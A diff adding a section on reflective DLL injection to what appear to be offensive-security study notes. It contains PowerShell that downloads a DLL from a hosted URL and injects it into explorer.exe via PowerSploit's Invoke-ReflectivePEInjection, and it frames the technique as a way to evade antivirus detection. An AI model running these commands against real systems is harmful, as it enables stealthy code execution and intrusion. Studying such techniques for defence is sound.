@@ -302,3 +302,36 @@ Explanation :
 # Reflective DLL Injection
 
 ## Theory
+
+- In DLL injection, the DLL is loaded from the disk to the remote process. Writing DLL to the disk can trigger AV and can compromise out attack.
+- A workaround to this problem would be to implement Reflective DLL injection. The DLL is injected to the victim process directly from memory rather than from disk.
+- This basically maps the DLL's Portable Executable format content into the memory.
+- We can use a powershell module to implement the functionality of the LoadLibrary but avoid writing to the disk and also bypass detection by process explorer and AV.
+- For this we can use the _Invoke-ReflectPEInjection_ to parse the contents of the PE file and perform reflection to avoid writing to the disk.
+- This tool has two functionalities: reflectively load PE or EXE to same process or reflective load DLL onto remote process.
+
+Import the powershell module :
+
+    Import-Module Invoke-ReflectivePEInjection.ps1
+
+Powershell Code to perform Reflective DLL Injection
+
+    $bytes = (New-Object System.Net.WebClient).DownloadData('<Hosted DLL file>')
+    $procid = (Get-Process -Name explorer).Id
+
+    Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+
+&nbsp;
+
+> Documentation :
+>
+> - https://github.com/stephenfewer/ReflectiveDLLInjection
+> - https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
+> - https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+> - https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
+
+&nbsp;
+
+# Process Hollowing
+
+## Theory
